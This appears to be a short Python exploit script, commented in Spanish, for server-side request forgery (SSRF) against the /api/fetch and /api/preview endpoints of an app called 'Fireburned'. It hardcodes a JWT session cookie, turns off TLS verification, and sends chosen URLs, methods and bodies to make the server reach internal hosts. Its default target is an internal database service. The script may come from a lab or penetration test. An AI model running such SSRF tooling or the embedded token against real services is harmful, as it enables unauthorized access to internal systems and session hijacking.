#!/usr/bin/env python3
"""Fireburned - prueba de SSRF contra /api/fetch y /api/preview."""
import json
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://<host>/fireburned"
COOKIE = ("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."
          "eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzkzMjkwMzIyLCJpYXQiOjE3OTMyNzUyMTcs"
          "Imp0aSI6ImRjNGRiYzVkYzNmZTRhZjU4NDg3MWYwNWRlNDAxY2U5IiwidXNlcl9pZCI6NzI1ODB9."
          "Rek2ZfeWhhUNwgmKuV0T379pAW94-HZToSBksS-it3M")
HEADERS = {"User-Agent": "Mozilla/5.0", "Cookie": f"access={COOKIE}",
           "Content-Type": "application/json"}


def call(path, payload, tries=6, timeout=15):
    last = None
    for i in range(tries):
        t0 = time.time()
        try:
            r = requests.post(BASE + path, data=json.dumps(payload),
                              headers=HEADERS, timeout=timeout, verify=False)
            dt = round(time.time() - t0, 1)
            if r.status_code in (502, 503, 504):
                last = f"{r.status_code} ({dt}s)"
                time.sleep(0.3)
                continue
            print(f"[{path}] {r.status_code} {len(r.content)}b {dt}s")
            print(r.text[:3000])
            return r
        except Exception as e:
            last = f"{type(e).__name__} ({round(time.time()-t0,1)}s)"
        time.sleep(0.3)
    print(f"[{path}] FALLO: {last}")
    return None


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "fetch"
    url = sys.argv[2] if len(sys.argv) > 2 else "http://fireburned--db:8080/"
    method = sys.argv[3] if len(sys.argv) > 3 else "GET"
    body = sys.argv[4] if len(sys.argv) > 4 else None
    payload = {"url": url, "method": method}
    if body:
        payload["body"] = body
    call("/api/preview" if mode == "preview" else "/api/fetch", payload)
